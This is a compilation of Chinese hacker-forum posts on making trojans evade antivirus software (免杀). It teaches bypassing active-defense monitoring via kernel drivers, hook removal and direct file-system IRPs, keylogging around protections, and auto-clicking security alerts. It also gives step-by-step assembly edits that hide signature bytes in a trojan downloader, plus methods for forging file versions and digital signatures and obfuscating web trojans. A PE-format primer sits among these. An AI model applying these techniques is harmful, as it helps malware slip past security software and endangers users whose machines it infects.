注：由于主动防御具有进入核心态监控功能，所以需要绕过进入

核心态监控技术的配合，相关技术详见后文

? 对于注册表修改通知类监控，可以摘除通知钩子；对

于360安全卫士定时枚举类监控，还可以修改后立即

采用Rootkit技术隐藏注册表相关键值

@@@@@@@@@@@@@@@@@@@@@@@进入核心态@@@@@@@@@@@@@@@@@@@@@@@@@

内核级Rootkit技术以及实现某些高级功能均必须需

进入核心态

方法:通过SCM（Service Control Manager）安装驱动

进入核心态监控 原理

? 挂钩驱动加载、物理内存访问相关的函数

? 监控相关注册表键值的写入

绕过监控实现进入核心态

1.写注册表+ZwLoadDriver 安装驱动

Hive方法写注册表，如果目标安全软件监控ZwLoadDriver则首次不加载，重

启后生效

2\. ZwSetSystemInformation

3\. ZwSystemDebugControl

4\. 物理内存对象 \Device\PhysicalMemory

注：使用符号连接绕过某些主动防御对物理内存对象的监控

5\. 权限提升漏洞，0day、Nday...

比如最近的WinPcap、赛门铁克产品中symtdi.sys等漏洞

6\. 感染系统文件，比如win32k.sys，再添加Callgate

@@@@@@@@@@@@@@@@@@@@@@文件监控@@@@@@@@@@@@@@@@@@@@@@@@

文件监控原理

? SSDT Hook

? IRP Hook

1\. 修改驱动分发函数例程表中的地址

2\. 修改IRP处理函数体中的指令

3\. 文件过滤驱动

? 效果：某些安全软件禁止在Windows系统目录下创建可执行文件，以及木马释

放文件时提示Hidden Install

绕过监控实现文件操作

1\. 直接给FSD发送IRP，可以绕过系统服务类挂钩（比如SSDT Hook，以及

更浅的钩子）

2\. 对于文件过滤驱动，可以在设备栈中断链，摘除过滤驱动

3\. 恢复FSD Dispatch Routine地址和函数体本身

4\. Raw disk 读写

5\. 利用白名单（比如针对McAfee 8.5企业版）

6\. 其他一些Tips...

逻辑智能判断

在现实应用中，杀毒软件以及安全软件套装并不是每当你在敏感目录（比如

系统目录）中新建可执行文件就会报警。安全软件为了提高产品的易用性和

友好性，加入了一些逻辑智能判断。

通常的判断逻辑是：具有可见界面的进程释放文件至系统目录时不会报警；

而没有界面的进程释放文件至系统目录时就会报警，提示Hidden Install 或

者Dropper

绕过其监控的方法

简便绕过方法：在自身程序中建一个对话框，大小只有1*1像素，位置可

以定位在屏幕的左上角，用户根本无法察觉，释放文件后再消失。 这样就可

以绕过主动防御的文件创建监控，而无需使用驱动直接和FSD通信。

@@@@@@@@@@@@@@@@@@@@@@@@@@@其他@@@@@@@@@@@@@@@@@@@@@@@@@@

---------键盘记录/密码获取

? 监控原理：

监控全局钩子安装，挂钩win32k!NtUserShowWindow等

? 绕过方法

1\. 进核心态恢复钩子

2\. 使用其他方法:

GetKeyState/GetAsyncKeyState

DirtecX 接口

键盘过滤驱动

原始输入设备raw input

内存读取（有的安全软件挂钩NtOpenProcess进行保护，绕过方法

详见上文中突破ZoneAlarm Pro的方法）

嗅探数据包 、 IE COM 接口 、GetWindowText

etc…

---------脱钩技术

? Hook种类：

Ring3、Ring0；

修改表中地址、修改函数体内指令；

SSDT hook、IAT hook、EAT hook、IDT hook、SYSENTER

hook、Driver IRP Dispatch hook 、DRX hook、

KiSystemService Hook、Filter Driver etc；

etc

? 对应脱钩方法...

------------常用的非底层技术类绕过主动防御方法

修改日期

不停的查找安全软件的报警窗口，然后自动点确定/允许按钮

通过IOCTL与安全软件通信，使其停止工作

模拟键盘事件，使其停止工作

etc…

@@@@@@@@@@@@@@@@@@@@@恶意软件技术展望@@@@@@@@@@@@@@@@@@

? 反高级启发式查毒

继主动防御之后，某些杀毒软件融合SandBox等高级启发式查毒

技术，比如卡巴斯基7.0、Norman、趋势科技的Officescan。

以卡巴斯基7.0为例，开启高级启发式查毒进行病毒扫描，可以

扫描所有采用传统代码注入的未知病毒。Sanbox技术有点主动

防御静态扫描化的意味。使用上文提到的某些技术可以绕过

Sanbox

? 写固件、NDIS层自主协议栈，增强隐蔽性

? 回归文件感染型病毒，花指令、多态变形等埋没在后门木马世界

多年的词汇应该苏醒了

? 结合提权0day，使Guset/User权限下照常安装rootkit

? 兼容Vista

? Etc…

绝对强大和实用，multiCCL作者的一篇关于从函数过杀软的相关讨论（及关于重定位问题）

文章是2006年的，multiCCL的作者niu-cow 写的，现在对付NOD32和特征码在重定位的地方依然有效。特别是对于DLL文件。

问题：

13141207              00             db 00

13141208           $- FF25 00101413  jmp dword ptr ds:[&lt;&amp;kernel32.CloseHandle&gt;] ;  kernel32.CloseHandle

1314120E           $- FF25 04101413  jmp dword ptr ds:[&lt;&amp;kernel32.CreateRemoteT&gt;;  kernel32.CreateRemoteThread

13141214           .- FF25 08101413  jmp dword ptr ds:[&lt;&amp;kernel32.ExitProcess&gt;] ;  kernel32.ExitProcess

1314121A           $- FF25 0C101413  jmp dword ptr ds:[&lt;&amp;kernel32.GetModuleHand&gt;;  kernel32.GetModuleHandleA

13141220           $- FF25 10101413  jmp dword ptr ds:[&lt;&amp;kernel32.OpenProcess&gt;] ;  kernel32.OpenProcess

13141226           $- FF25 14101413  jmp dword ptr ds:[&lt;&amp;kernel32.Sleep&gt;]       ;  kernel32.Sleep

1314122C           $- FF25 18101413  jmp dword ptr ds:[&lt;&amp;kernel32.VirtualAllocE&gt;;  kernel32.VirtualAllocEx

13141232           $- FF25 1C101413  jmp dword ptr ds:[&lt;&amp;kernel32.VirtualFreeEx&gt;;  kernel32.VirtualFreeEx

13141238           $- FF25 20101413  jmp dword ptr ds:[&lt;&amp;kernel32.WinExec&gt;]     ;  kernel32.WinExec

1314123E           $- FF25 24101413  jmp dword ptr ds:[&lt;&amp;kernel32.WriteProcessM&gt;;  kernel32.WriteProcessMemory

13141244           .- FF25 2C101413  jmp dword ptr ds:[&lt;&amp;urlmon.URLDownloadToFi&gt;;  urlmon.URLDownloadToFileA

1314124A           $- FF25 34101413  jmp dword ptr ds:[&lt;&amp;user32.FindWindowA&gt;]   ;  USER32.FindWindowA

13141250           $- FF25 38101413  jmp dword ptr ds:[&lt;&amp;user32.GetWindowThread&gt;;  USER32.GetWindowThreadProcessId

13141256              CC             int3

上面是一下载者的例子：大家看看在过杀软上能不能在这里作文章。

以下是multiCCL作者的回答：

这片跳转有个非正式的名称－－&quot;跳转表&quot;，显示为函数是OD的显示方式问题。双击一下汇编代码，就可以在编辑框看到类似 jmp [xxxxxxxx] 的代码了，其中 xxxxxxxx 指向某个输入函数的IAT。

就每个跳转来说，FF25之后的四个字节在加载时会被加载器重定位，也就是说这四个字节表示地址的数据加载时会被修改。试图在这四个字节放置指令都会失败。要改也只能改FF25这两个字节

一种修改方法是

　　在空隙构造 xxxxxxxx 的重定位，然后跳向重定位后的目标，

　　再修改相关的CALL，指向构造的代码。

下面是multiCCL作者给出的修改实例：

以下是有关涉及重定位问题的特征码修改示例，附件就不发了，知道意思就行了

00001B4E: FF25 04210010         JMP [10002104] ;这样好看多了

0000198B: FF15 20210010       CALL [10002120]

00001555: 8B3D 4C210010       MOV EDI,[1000214C]

=======================================================================

=======================================================================

看看我对第一处的修改：

注意看重定位问题

（一般调用输入函数返回时，EAX放返回值，所以可以在压栈之后调用之前放心使用EAX）

　　使用EAX做重定位处理。

用OD打开

修改方法如下：

A:找一处空隙：

10001FD0     90         nop

10001FD1     90         nop       ;先来两个NOP，防止花指令

10001FD2     E8 00000000   ;这句用二进制编辑，很重要，OD的右键有

           ;完成后这句指令就变成 call   10001FD7

;接下来

10001FD7     58         pop   eax

10001FD8     2D D71F0010   sub   eax, 10001FD7 ;这个数对应前面的call

10001FDD     05 04210010   add   eax, 10002104 ;这个是函数地址

 ;对照第一处特征码（ 00001B4E: FF25 04210010   JMP [10002104] ）

                         ; &lt;&amp;MFC42.#269_AFX_MODULE_STA&gt;

;到这里，函数地址的重定位就完成了

10001FE2     FF20       jmp   [eax]   ;跳到重定位后的函数入口

B:

把光标移到第一处特征码那一行单击

------------

10001FD0=10001FD0

本地调用来自 10001773

------------

转到10001773处，

10001773 |. E8 D6030000   call   10001B4E

改为

10001773   E8 58080000   call   10001FD0 ;指向刚才空隙中的代码起始

这里只有来自10001773的一处调用，如果有多处调用就要改多处，方法一样

C:

把第一处特征码的代码NOP掉

（实际改变的只是FF25这两个字节，后面的04210010在加载时会被加载器改回来）

                           niu-cow 2006-06-04

－－－－－－－－－－－－－－－－

--------------------------------------------------------------------------

看这个特征码：

0000198B: FF15 20210010       CALL [10002120]

此处有重定位，重定位的范围是0000198d-00001990,即20210010四个字节

这四个字节上不要放指令，会被加载器破坏的，以后NOP掉就是了

看看前后：

10001987 |. FF7424 04   push   dword ptr [esp+4]   ; /func

1000198B |. FF15 20210010 call   [10002120] ; &lt;&amp;MSVCRT._onexit&gt;

10001991 |. 59         pop   ecx

第二句没有跳入，可以用万能跳转法

（第一句没关系的，只要没有跳入到&quot;中腰&quot;就行。第三句不改，不用考虑）

从10001987处跳出去吧（万能跳转法），jmp　只要五个字节，改到1000198b,

没有到重定位的地方。

A:

找一处空隙

10001FA0     90         nop ;防止花指令，方便修改

10001FA1     90         nop

10001FA2     FF7424 04   push   dword ptr [esp+4] ;原来的指令补回去

10001FA6     E8 00000000   ;二进制编辑

                 ;指令变为 call   10001FAB

10001FAB     58         pop   eax

10001FAC     2D AB1F0010   sub   eax, 10001FAB ;对应前面的call的地址

                 ;从call开始的这三句构成重定位差

                 ;哪个寄存器空闲就用哪个，call前面一般用eax

10001FB1     05 20210010   add   eax,10002120 ; &lt;&amp;MSVCRT._onexit&gt;

                 ;把原来函数的地址加上重定位差

                 ;到这里，函数地址的重定位已经完成了

10001FB6     FF10       call   [eax]     ;调用函数

10001FB8   ^ E9 D4F9FFFF   jmp   10001991   ;返回后跳回到下一句

                             ;不要跳到0000198d-00001990

B:

10001987   /E9 14060000   jmp   10001FA0 ;跳到刚才空隙中代码的起始

1000198C   |90         nop

1000198D   |90         nop

1000198E   |90         nop

1000198F   |90         nop

10001990   |90         nop

-------------------------------------

------------------------------------------------------------------------

再看这个

00001555: 8B3D 4C210010       MOV EDI,[1000214C]

此处MOV指令将改变EDI的值，所以等下重定位时也使用EDI，这样最保险

同样不要在00001557-0000155A 改指令，以后NOP掉就是了

同样用OD打开，看看

10001551 |. 8B5424 16   mov   edx, [esp+16]

10001555 |. 8B3D 4C210010 mov   edi, [1000214C] ;USER32.wsprintfA

第二句没有跳入，这样可以用万能跳转法

A:

找一处空隙

10001F70     90         nop

10001F71     90         nop

10001F72     8B5424 16   mov   edx, [esp+16];补指令，老规矩

10001F76     E8 00000000   ;这句不用再说了吧call   10001F7B

10001F7B     5F         pop   edi ;直接用edi，这是技巧

10001F7C     81EF 7B1F0010 sub   edi, 10001F7B

                     ;这样，edi 已经是重定位差了

10001F82     81C7 4C210010 add   edi, 1000214C ; &lt;&amp;USER32.wsprintfA&gt;

           ;edi的值已经重定位了，

;但现在还不行，注意，原来的指令有个方括号，也就是取地址所指的内存的值

;2006-06-09修改时疏忽了　　　　（2006-06-14 修正）

10001F88     8B3F       mov   edi, [edi]

       ;跳回到原来的下一句吧（这句也要修正，指令相同但机器码不同）

           ;同样不要跳到NOP掉的地方，这样保险

10001F8A   ^ E9 CCF5FFFF   jmp   1000155B

B:

10001551   /E9 1A0A0000   jmp   10001F70 ;这个也不再解释了

10001556   |90         nop

10001557   |90         nop

10001558   |90         nop

10001559   |90         nop

1000155A   |90         nop

－－－－－－－－－－－－－－－－

----------------------------------------------------------------------------

－－－－－－－－－－－－－－－－

好了，总结一下

重定位的方法其实很简单

先求重定位差：

nop ;先来几个nop防止出现花指令

   ;（这样修改时看得清楚些，或者再放些垃圾指令）

e8 00 00 00 00 ;这句将变为call xxxxxxxx

         ;用C32ASM看到的地址和OLLYDBG看到的不一样，没关系的，

         ;看到啥就是啥

pop eax ; 或别的寄存器，一定要空闲

sub eax,xxxxxxxx     ;每句之间都可放垃圾指令，只要不破坏现场就行了

然后

add eax,yyyyyyyy ;yyyyyyyy为需要重定位的(原来的)地址值，

           ;加上前面求出的重定位差

           ;就完成了重定位

至于重定位之后，该怎么办就怎么办

空隙要足够大，加了垃圾指令需要更大的空隙。

直接寻址的地方会被加载器重定位的，别试图在这些地方修改指令

剩下的就是跳来跳去的问题了，ok

                     niu-cow 2006-06-09

                     （2006-06-14 修正）

如果操作数的偏移地址是以一个立即数表示，这种寻址叫直接寻址，

如果操作数的偏移地址以 基址寄存器 或/和 谈起寄存器　加 位移量 表示的，叫间接寻址。

但是间接寻址的概念在修改时的不是很重要。

在修改时，与&quot;直接寻址&quot;相对的却是&quot;相对寻址&quot;，这点比较关键。

比如下面的JE就是相对寻址，跳转的目的地址004A5C79 与004A5C68相距是11字节，JE的这句的机器码是7411。

004A5C66   . /74 11       je     short 004A5C79   ;这句是相对寻址，不需重定位

004A5C68   . |C605 84BF4A00&gt;mov   byte ptr [4ABF84], 0

004A5C6F   . |……

004A5C74   . |……

004A5C79   &gt; \A1 7C8C4A00   mov   eax, [4A8C7C]   ;这句是直接寻址，需要重定位

     ;其中004A5C7A－004A5C7D在加载时，会被加载器修改

虽然

mov eax,13145

mov eax,[eax]

这样的算是间接寻址，钽不是相对寻址，还是要重定位的。因为当程序系统加载时，假设加载基址是00400000或00500000，去13145找数据肯定出错，原来的地址13145必须相应地修正到00413145或00513145，这个修正就叫重定位。

　　重定位一般由系统加载器自动完成，如果把需要重定位的指令移到了别的地方，系统加载器修正的却是原来的地方，这样程序就挂了。所以要在这句指令执行前，构造修正代码修正需要重定位的指令。

　　同时修改包含重定位位的语句时，要避开被重定位的那几个字节（如前面的004A5C7A－004A5C7D，这几个字节NOP掉或放些垃圾指令，反正加载时指令都被破坏）

　　原理大致就这些，再参考参考汇编、ＰＥ相关的教程吧

什么叫PE文件：

PE文件指的是可移植可执行(Portable Executable)文件。这些文件通常是DLL和EXE文件。一个 PE 文件中可以有多个命名空间，也可以包括嵌套的命名空间。而一个命名空间可以拆分到多个 PE 文件。一个或多个 PE 文件（可能还有其它非PE文件，如资源文件）可以组合在一起创建程序集。程序集是可部署、可进行版本编号和可复用的物理单元。

二

PE文件的基本术语：

1、文件地址：

分为

偏移地址（C32载入可见，是PE文件储存在硬盘上时的一个内部的绝对地址）

RVA地址（PE文件各数据导入内存镜像后相对于基地址的偏移量）

VA地址（PE文件各数据导入内存镜像后虚拟地址，OD载入可见）

基地址（PE文件导入内存镜像时的初始地址，EXE缺省值为00010000h，DLL为00400000h）

其中

VA地址=RVA地址+基地址

举例：图书馆的每本书都是存放在固定的书架上的，其存放地址称之为偏移地址；

图书馆外借时都有个外借编码，称之为VA地址，外借编码前面标识的外借日期称为基地址，外借序号称为RVA地址；

其中

外借编码=外借日期+外借序号。

0812030456=081203+0456

2、区段：

PE文件在载入内存镜像时，是分段载入的，表示为区段，故偏移地址要转换成RVA、VA地址，每个区段的计算公式是不一样的。

举例：列车分为驾驶区、动力区、软卧区、硬卧区、餐车、软座区、硬座区、车尾。

3、常见目录表：

输入表--PE文件调用WINDOWS DLL函数的列表

输出表--PE文件输出DLL函数的列表

重定位表--PE文件用来重新定位某些代码（字符串、指针地址等等）的列表。

资源表--PE文件运行时释放出的一些资源文件（如DLL、EXE、图标、图形界面CSS等等）

举例：在打网球时，我们用网球俱乐部提供的网球、场地等等就称为输入表；而我们自己拿出自己专用的球拍、护腕、头巾等等，则称为输出表；我们根据俱乐部发给我们的号码牌，根据号码牌上的号码，去储物柜拿我们储存进去的一些东西时，称为重定位表；我们身上穿的衣服、带的钥匙、包括皮肤颜色、背包，统称为资源表。

4、代码：

分为

HEX十六进制代码

字符代码

（字符代码分为字符串和乱码，字符串有ASCII字符串和UNICODE字符串两种）

ASCII字符串读取以一个00结束

UNICODE字符串以2个00结束，或以读取错误结束（字符之间没有00间隔）

汇编代码

5、高位读取：

PE文件有个原则--高位读取。

比如文件中有段代码是指针：7F 98 01 00。

那么这段代码应该从高位读取00 01 98 7F，转换成指针：0001987F，PE文件里的指针一般为RVA地址。

----------------------------------------------------

一、PE文件框架

在PE文件中，偏移地址一般在400后才有相应的RVA地址和VA地址，这是因为PE文件在导入内存镜像时，只把偏移地址400后的数据导入，400前的地址只是起到一个系统用来导入400后的向导作用，是不导入内存镜像的。

PE文件框架构成

MZ头

DOS STUB

PE头

区段表

区段1

区段2

区段...

区段n

上表是PE文件结构的总体层次分布。

1\. MZ头（IMAGE_DOS HEADER）

所有PE 文件（甚至32位的DLLs）必须以简单的DOS MZ Header开始，它是一个IMAGE_DOS_HEADER结构。是DOS文件的标志，在文件的起始位置可以看到以十六进制4D 5A为开头的MZ。免杀俗称为MZ头。

有了它，一旦程序在DOS 下执行，DOS 就能识别出这是一个有效的执行体，然后运行紧随的MZ Header 之后的DOS Stub。

2\. DOS STUB

DOS Stub实际上是一个有效的EXE，在不支持PE 文件格式的操作系统中，它仍将简单的显示一个错误提示，类似与字符串&quot;This program requires Windows&quot;或者程序员可根据自己的意图实现完整的DOS代码。大多数情况下是有汇编器自动生成的。

3\. PE头（IMAGE_NT_HEADERS）

   紧接着DOS Stub的是PE Header。它是一个 IMAGE_NT_HEADERS的结构。其中包含了很多PE文件被载入内存的时候需要用到的重要域。执行体在支持PE文件结构的操作系统中执行，PE装载器将从DOS MZ Header 中找到PE header 的起始偏移量。因而跳过DOS Stub 直接定位真正的文件头 PE Header。免杀俗称为PE头。

4.区段表（Section Table）

PE Header 之后的数组结构Section Table（免杀俗称为区段表）。如果PE文件里有5个区段，那么此Section Table 结构数组就有5个（IMAGE_SECTION_HEADER）成员，每个成员包含对应的区段的属性(用loadPE 可以看到在区段里)、文件偏移量、虚拟偏移量（RVA）等。

5.区段（Sections）

PE 文件真正内容划分成块，称为Sections（免杀俗称为区段）。 每个标准区段的名字均以圆点开头  （这个看不出来 用loadpe看看 &amp;apos;.&amp;apos; 就是2E），但也有可以不以圆点开头的，区段名的最大长度为8字节。区段是以其起始位址来排列，而不是以其字母次序来排列。通过区段表提供的信息可以找到这些区段。程序的代码，资源等就放在这些区段中。

区段的划分是基于各组数据的共同属性，而不是逻辑概念。每个是一块拥有共同属性的数据，比如代码/数据、读/写等。如果PE 文件的数据/代码拥有相同的属性,它们就能被归入同一区段中。区段名称仅仅是个区别不同区段的符号而已，类似&quot;data&quot;，&quot;code&quot;只是为了便于识别，大家可以随便改。唯有区段的属性设置决定了区段的特性和功能。这就类似于我们上节课提到的一个火车的例子一样的，车厢的功能决定了火车的区段划分。

二、PE文件常见区段及其代码类型

一个Windows NT的应用程序典型地拥有9个预定义段，它们是：

常用区段名

区段类型

区段说明

.text

代码区段

汇编语言

.bss

未初始化区段

附加数据（某些配置信息）

.rdata

只读数据区段

输入、输出表

.data

全局变量数据区段

字符串

.rsrc

资源区段

资源信息

.edata

只读数据区段

输出表

.idata

只读数据区段

输入表

.pdata

只读数据区段

.debug

调试区段

-----------------------------------------------------------------

.code

.reloc

重定位表区段

重定位表

其他加壳加密软件例子

.upx

UPX加壳

.vmp

VMP加密

其中资源区段.rsrc（资源工具：Resource Hacker，FreeRes和eXeScope只识别其区段名）是判断某些木马是否需要导出资源再进行免杀的关键

个人总结

对NOD32时　需要注意以下几点

（１）首先定位低启发的特征，过了低启发再定位高启发

（２）分块个数选择１０，多了容易发生特征码的死循环现象

（３）选择反向定位，正向定位一般会定位在dll名称上，反向可以定位出dll文件里的函数

（４）开始位置选择第一个区段的起始位置，特征码定位在PE结构上是的话，肯定是假特征

（５）特征分析，杀在push上的话，一般是杀在函数的参数上，因为调用函数前程序需要先把参数压入堆栈或者寄存器，不要去修改push，跟随到CALL的地方，一般在特征的下面不远处，然后用跨区段跳转技术（最好自己加个区段，比较稳定，空间也比较大）对付

（６）如果生成１０个特征文件，杀软报出具有不同的病毒名称的话，用病毒名称过滤技术对应删除，需要仔细，然后测试，看杀软还有没有上报这个病毒名称。

转载请注明出自暗组信息安全论坛 [http://www.darkst.com/bbs/](http://www.darkst.com/bbs/) ,本贴地址: [http://www.darkst.com/bbs/viewthread.php?tid=48918](http://www.darkst.com/bbs/viewthread.php?tid=48918)

木马免杀的一些个人经验

PE类：EXE. dll

1.脱壳解密

脱壳在木马免杀中由为重要！。。所以希望大家好好学习脱壳

脱壳的好坏直接影响到木马免杀效果（如果不完全脱壳，在&lt;定位内存特征码&gt;可能会使定位中没发现特征码但是运行中又发现木马。）

2.定位特征码

一般从大范围定位后逐渐缩小范围（字节型）

（个数型）一般从生成100个数的大致定位特征码后转入字节型定位。

单一文件特征码定位：CLL MYCLL multiCCL

复合文件特征码定位：MYCLL multiCCL

内存特征码定位： OD（一半一半定位） MYCLL multiCCL  [一般都要确定你的文件是否完美完全脱壳后在进行文件特征码定位]

3.特征码修改

简单的等效代码转换如下：（不过有时改后也损坏文件所以看情况）

push　变　pop　

je  变　jnz

add 变 sub    

add ecx,2 可以改为　sub ecx,-2

加ecx内存器＋2   减ecx内存器-2　　- -2得＝2

上面的等效代码用不了还是乖乖用，JMP跳转法把特征码转移

4.附加数据加密算法变形

这个方法已经被pcshare冰雨发布了，就是pcshare附加数据的配置信息是xor 加密的。被杀毒定义了 所以我们只要改算法 xor 值 变一下就可以了！

5.RAR自解压（加密）

说白就是捆绑而已呵呵，不过去除右键 对部分杀毒有效无法分离出木马！可以躲避查杀 而且可变性比较强所以还有用武之地！

2009年重头戏，主动防御

6.文件版本伪造及数字签名的伪造

文件版本是一个用来描述文件用途及生产产商的相关信息

数字签名是个加密的过程，数字签名验证是个解密的过程。

数字签名主要的功能是：保证信息传输的完整性、发送者的身份认证、防止交易中的抵赖发生。

卡巴斯基主动防御模块有对数字签名进行验证，瑞星2009主动防御模块有对文件版本信息进行验证。

相关工具和教程可以在论坛中搜索即可找到

*******************************************************

网页木马类： JS html htm asp 等

1.拆分变量。

用&amp;连接符号，拆分变量

2.加入垃圾代码。

和PE免杀花指令差不多，一些无用的垃圾变量或者空格一些特殊字符 或者GIF98 类似的文件头来做&quot;花指令&quot;呵呵！

3.等值代码修改

&lt;html&gt;&lt;/html&gt;

&lt;htm&gt;&lt;/htm&gt;

把html全部改htm 效果一样

4.代码添零

在记事本中加入空格，然后用16进制的编辑器（Uedit32）打开把 空格对应（20）替换成（00） 即可

该方法运用广泛。使用简单！！推荐 呵呵

5.编码加密(工具见附件)

6.使用变量（赋值语句）

变量名 = 函数或者语句

然后用的时候直接写变量名

7.字符反置（StrReverse反转函数）

使用函数StrReverse()，asp和js里面都有这个函数，针对一些字符串做免杀很好！

使用：StrReverse(哦的示演)， 输出结果就是&quot;演示的哦&quot; 也就是字符位置倒排了。做ASP免杀和HTML网马效果应该很不错。

8.字符简体转繁体

很多时候杀毒软件喜欢用一串字符和，一个字符作为特征码，这个时候我们可以尝试转换一下。如将简体转繁体 也许杀毒软件就不在报毒了。

这个方法很好运用只需要下载我写的：繁简转换精灵V1.0 即可！

www.it713.com